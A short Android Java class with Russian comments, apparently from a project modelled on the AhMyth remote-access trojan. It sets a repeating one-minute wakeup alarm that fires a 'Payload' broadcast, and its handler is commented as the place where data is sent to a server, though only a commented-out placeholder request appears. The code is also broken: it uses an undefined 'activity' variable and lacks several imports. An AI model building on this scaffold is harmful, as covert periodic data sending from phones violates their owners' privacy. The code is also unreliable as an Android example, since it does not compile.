/*
 * Copyright 2020 Andrey Emelyanov (aemelyanov757@gmail.com)
 *
 * Класс создает таймерное событие, обработчик onReceive(...) - отправка данных на сервер
 *
 */

package ahmyth.mine.king.ahmyth;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.Service;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;


public class Alarm extends BroadcastReceiver { 
    public static void set(Context context) { 
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE); 
        Intent intent = new Intent(activity, Payload.class); 
        PendingIntent pIntent = PendingIntent.getBroadcast(activity, 0, intent, 0);
        // таймер на 1 минуту = 1 * 60 * 1000
        am.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime(), 1 * 60 * 1000, pIntent);
    } 
    
    @Override 
    public void onReceive(Context context, Intent intent) { 
        // Здесь код отправки данных
        //new RequestTask().execute("http://stackoverflow.com");
    } 
}


